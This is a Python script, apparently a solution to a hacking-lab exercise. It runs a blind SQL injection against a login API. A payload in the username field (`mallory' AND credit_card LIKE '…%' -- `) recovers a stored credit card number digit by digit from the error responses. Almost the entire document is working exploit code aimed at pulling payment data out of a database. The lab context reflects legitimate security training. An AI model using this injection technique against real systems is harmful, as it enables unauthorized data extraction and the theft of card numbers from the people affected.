import requests

'''
Use burp suite to intercept the request and send it to repeater to figure out the correct request
In my case it was `mallory' AND credit_card LIKE '2%' -- `
Then use this script to automatically find the rest of the credit card number
'''

url = '14e5292f-e776-431d-84f5-6fc3b73e0d9b.idocker.vuln.land'
headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/json',
    'Origin': 'https://14e5292f-e776-431d-84f5-6fc3b73e0d9b.idocker.vuln.land',
    'Referer': 'https://14e5292f-e776-431d-84f5-6fc3b73e0d9b.idocker.vuln.land/login',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Te': 'trailers'
}

data = {
    "username": "mallory' AND credit_card LIKE ",
    "password": "password"
}

found_digits = []

def format_digits():
    # Convert the digits to strings
    str_found_digits = ''.join(str(digit) for digit in found_digits)

    # Format the digits to be in credit card format
    if len(str_found_digits) < 4:
        formatted_digits = str_found_digits
    else:
        last_group_index = len(str_found_digits) // 4 * 4

        main_group = str_found_digits[:last_group_index]
        remainder = str_found_digits[last_group_index:]

        formatted_main_group = ''.join([main_group[i:i + 4] + ' ' for i in range(0, len(main_group), 4)])

        formatted_digits = formatted_main_group + remainder if remainder else formatted_main_group

    return formatted_digits
def check_digit(new_digit):
    formatted_digits = format_digits()

    data['username'] = f"mallory' AND credit_card LIKE '{formatted_digits}{new_digit}%' -- "
    response = requests.post('https://' + url + '/api/login', headers=headers, json=data)
    if 'Invalid user or password' in response.text:
        print(f"Found: {new_digit}")
        return True
    else:
        return False


def find_new_digit():
    if len(found_digits) == 16:
        print(f"The credit card number is {format_digits()}")
        return True
    else:
        for digit in range(10):
            if check_digit(digit):
                found_digits.append(digit)
                find_new_digit()


find_new_digit()
